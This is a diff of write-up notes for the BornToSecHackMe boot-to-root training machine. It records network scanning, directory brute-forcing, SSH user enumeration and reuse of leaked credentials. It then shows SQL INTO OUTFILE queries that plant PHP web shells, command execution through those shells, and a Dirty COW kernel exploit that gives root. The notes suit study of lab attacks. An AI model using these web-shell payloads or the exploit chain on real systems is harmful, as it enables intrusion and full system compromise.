@@ -1,4 +1,8 @@
-nmap -sn 192.168.1.0/24 
+>> ENUMERATION STEPS
+
+	> Find the IP adress of the machine
+
+$$ nmap -sn 192.168.1.0/24 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-07 10:18 EST
 Nmap scan report for Air-de-Ymane.lan (192.168.1.1)
 Host is up (0.0045s latency).
@@ -9,10 +13,11 @@ Host is up (0.00087s latency).
 Nmap scan report for bbox.lan (192.168.1.254)
 Host is up (0.0049s latency).
 Nmap done: 256 IP addresses (4 hosts up) scanned in 2.41 seconds
+...
 
-----------
+	> Scan for services and vulnerabilities
 
-└─$ nmap -sV -sC  192.168.1.4
+$$ nmap -sV -sC  192.168.1.4
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-07 10:20 EST
 Nmap scan report for BornToSecHackMe.lan (192.168.1.4)
 Host is up (0.0029s latency).
@@ -55,70 +60,33 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.35 seconds
 
----------------
+>> FIRST TRACK : HTTP and HTTPS
 
-dirb http://192.168.1.50
-
------------------
-DIRB v2.22
-By The Dark Raver
------------------
-
-START_TIME: Wed Feb  7 10:43:57 2024
-URL_BASE: http://192.168.1.50/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-
------------------
-
-GENERATED WORDS: 4612
-
+$$ dirb http://192.168.1.50
+...
 ---- Scanning URL: http://192.168.1.50/ ----
 + http://192.168.1.50/cgi-bin/ (CODE:403|SIZE:288)
 ==> DIRECTORY: http://192.168.1.50/fonts/
 + http://192.168.1.50/forum (CODE:403|SIZE:285)
 + http://192.168.1.50/index.html (CODE:200|SIZE:1025)
 + http://192.168.1.50/server-status (CODE:403|SIZE:293)
+...
 
----- Entering directory: http://192.168.1.50/fonts/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.
-    (Use mode '-w' if you want to scan it anyway)
+## Nothing interesting 
 
------------------
-END_TIME: Wed Feb  7 10:44:18 2024
-DOWNLOADED: 4612 - FOUND: 4
-
-## Looking in fonts/ but nothing interesting
-
---------
-
-dirb https://192.168.1.50:443     
-
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
-
-START_TIME: Wed Feb  7 10:49:17 2024
-URL_BASE: https://192.168.1.50:443/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-
------------------
-
-GENERATED WORDS: 4612                                                          
-
+$$ dirb https://192.168.1.50:443     
+...
 ---- Scanning URL: https://192.168.1.50:443/ ----
 + https://192.168.1.50:443/cgi-bin/ (CODE:403|SIZE:289)                         
 ==> DIRECTORY: https://192.168.1.50:443/forum/                                  
 ==> DIRECTORY: https://192.168.1.50:443/phpmyadmin/                             
 + https://192.168.1.50:443/server-status (CODE:403|SIZE:294)                    
 ==> DIRECTORY: https://192.168.1.50:443/webmail/ 
-[...]
+...
 
 ## Looking in each directories
 
-----------------
-
----- FORUM
+	> FORUM
 
 ## Probleme login?
 
@@ -135,21 +103,9 @@ Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]
 Oct 5 13:31:19 BornToSecHackMe sshd[20199]: reverse mapping checking getaddrinfo for ppp-253-14.20-151.wind.it [151.20.14.253] failed - POSSIBLE BREAK-IN ATTEMPT!
 Oct 5 13:31:19 BornToSecHackMe sshd[20199]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=151.20.14.253 user=root
 
-Oct 5 14:40:02 BornToSecHackMe CRON[23196]: pam_unix(cron:session): session closed for user root
-Oct 5 14:40:37 BornToSecHackMe sshd[23239]: Received disconnect from 222.122.118.49: 11: Bye Bye [preauth]
-
-Oct 5 14:46:43 BornToSecHackMe sshd[23499]: Received disconnect from 113.199.73.28: 11: Bye Bye [preauth]
-
-Oct 5 14:54:00 BornToSecHackMe sshd[23804]: Accepted password for admin from 62.210.32.157 port 61495 ssh2
-Oct 5 14:54:00 BornToSecHackMe sshd[23804]: pam_unix(sshd:session): session opened for user admin by (uid=0)
-
-Oct 5 14:54:29 BornToSecHackMe sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/sh
-
-Oct 5 15:03:55 BornToSecHackMe sudo: root : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/service vsftpd restart
-
-
 ```
-## Other subjects nothing interseting but login names:
+
+## A list of login names:
 - qudevide
 - zaz
 - wandre
@@ -165,12 +121,11 @@ Oct 5 15:03:55 BornToSecHackMe sudo: root : TTY=pts/0 ; PWD=/home/admin ; USER=r
 ## List users
 https://192.168.1.50/forum/index.php?mode=user
 
-## Trying to bruteforce
+## Trying to connect to the forum with the list of user and the list of keywords:
 Lmezard ok with password !q\]Ej?*5K5cy*AJ
 Found laurie@borntosec.net
 
 ## Enum Users with the list of login name found on the forum
-
 msf6 > use 54
 msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 192.168.56.5
 RHOSTS => 192.168.56.5
@@ -190,51 +145,46 @@ msf6 auxiliary(scanner/ssh/ssh_enumusers) > exploit
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 
----- WEBMAIL
+	> WEBMAIL
 
-## Trying bruteforce with the usernames and wordlists 
-ok : laurie@borntosec.net
+## Trying to connect to the webmail with the email and the list of keywords found on the forum
+laurie@borntosec.net
 !q\]Ej?*5K5cy*AJ
 
-Found 2 received mail
-2 sent mail
-
+## Found 2 received mail and 2 sent mail
 ## Another email
 - qudevide@mail.borntosec.net
 - ft_root@mail.borntosec.net
 
-## Password DB root
-
+## Found a root password to a databse
+------
 Hey Laurie,
-
 You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
-
 Best regards.
+------
 
+	> PHPMYADMIN
 
----- PHPMYADMIN
-
-## Trying bruteforce with usernames and wordlists
-
-## Connexion :
+## Connecting with root creds
 root
 Fg-'kKXBj87E:aJ$
-Fg-'kKXBj87E:a$J
-Fg-'kKXBj87E:Ja$
-Fg-'kKXBj87E:J$a
 
 ## User email list FORUM
 - admin@borntosec.net
-- laurie@
-- qudevide@
-- thor@
-- wandre@
-- zaz@
+- laurie@''
+- qudevide@''
+- thor@''
+- wandre@''
+- zaz@''
 
-# User mysql database
+## User mysql database
 - root
 - debian-sys-maint
 - phpmyadmin
+
+	>  SQL injection on the server from the phpmyadmin page
+
+## Create a table test to retrieve info
 
 CREATE TABLE test(
    ID int,
@@ -251,21 +201,24 @@ create a file =
 
 select "<? System($_REQUEST[‘cmd’]); ?>" into outfile '/var/www/cmd.php';
 
-POC =
+## Searching for a writable directory where to put our backdoor. Using dirb on phpmyadmin + forum + mail
+
+## POC
 SELECT '<?php phpinfo() ?>' INTO OUTFILE '/var/www/forum/templates_c/info.php' ;
 
-## ON THE FORUM PAGE
+cmd injection =
+SELECT "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/cmd.php' ;
 
-cmd injection = SELECT "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/cmd0.php' ;
+	> FORUM https://192.168.56.5/forum/cmd.php
 
 https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql
-
 https://192.168.56.5/forum/templates_c/cmd0.php?cmd=cat%20 ../../../../home/LOOKATME/password
-
+-----
 lmezard:
 G!@M6f4Eatau{sF"
+-----
 
-## FTP CONNEXION
+>> FTP
 
 ftp 192.168.56.5
 Connected to 192.168.56.5.
@@ -276,27 +229,27 @@ Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp>
-
 ftp> ls
 229 Entering Extended Passive Mode (|||18787|).
 150 Here comes the directory listing.
 -rwxr-x---    1 1001     1001           96 Oct 15  2015 README
 -rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
 
-## EXPLOITING THE FILES
-└─$ cat README    
+>> EXPLOITING THE FILES
+
+$$ cat README    
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 
-└─$ file fun
+$$ file fun
 fun: POSIX tar archive (GNU)
-└─$ tar xvf fun
+$$ tar xvf fun
 
-PCAP file but not realy, ascii
-cat * look like there is a program. Some function are in order but others not. Trying bruteforce way with the letters i don't have the order but time consuming.
-Look like //fileXX gives us a hint about the order: sorted the return 'x'; with the getmeX() function :
-cat *.pcap | grep -A 9 -E 'getme|return'
+## Found ascii files, with PCAP extension. 'cat *' look like there is a program. Some function are in order but others not. Trying bruteforce way with the letters i don't have the order but time consuming. Look like //fileXX gives us a hint about the order: sorted the return 'x'; with the getmeX() function :
 
+$$ cat *.pcap | grep -A 9 -E 'getme|return'
+[...]
+
+	> Reconstituted the original program
 `
 #include <string.h>
 #include <stdio.h>
@@ -372,18 +325,21 @@ int main() {
 }
 `
 
-└─$ ./a.out 
+$$ ./a.out 
 MY PASSWORD IS: Iheartpwnage
 Now SHA-256 it and submit
 
-result of sha-256 :
+## Result of sha-256 :
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
-### On the machine Laurie
-uname -a
+>> SSH with laurie and previous hashed password
+
+$ uname -a
 Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
 
-Dirty COW (CVE-2016-5195) : Kernel version 3.2.0 vuln 
+	> Found a vulnerability from the kernel version
+
+## Dirty COW (CVE-2016-5195) : Kernel version 3.2.0 vuln 
 
 laurie@BornToSecHackMe:/tmp$ ./dirty password
 /etc/passwd successfully backed up to /tmp/passwd.bak
@@ -399,8 +355,4 @@ laurie@BornToSecHackMe:/tmp$ su b2r
 Password:
 b2r@BornToSecHackMe:/tmp# id
 uid=0(b2r) gid=0(root) groups=0(root)
-
------------------
-
-For an RCE :
-https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html
+-----------
